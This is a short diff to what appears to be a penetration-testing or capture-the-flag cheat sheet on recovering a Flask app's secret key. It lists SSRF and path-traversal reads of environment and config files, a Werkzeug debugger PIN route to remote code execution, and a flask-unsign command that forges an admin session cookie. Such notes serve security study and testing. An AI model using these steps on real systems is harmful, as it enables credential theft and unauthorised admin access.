@@ -162,7 +162,7 @@ flask-unsign --sign --cookie '{"username":"admin","user_id":1}' --secret "FOUND_
 
 1. SSRF → `file:///proc/self/environ`, `file:///app/.env`.
 2. Path traversal → `config.py`, `settings.py`, `.env`.
-3. Werkzeug debugger console leak.
+3. Werkzeug debugger console (`debug=True`) — compute the PIN from file-read inputs for direct RCE: [lfi-to-rce.md](../../server-side/reference/scenarios/path-traversal/lfi-to-rce.md).
 4. `.git/` exposure → checkout configs.
 
 Forge admin session:
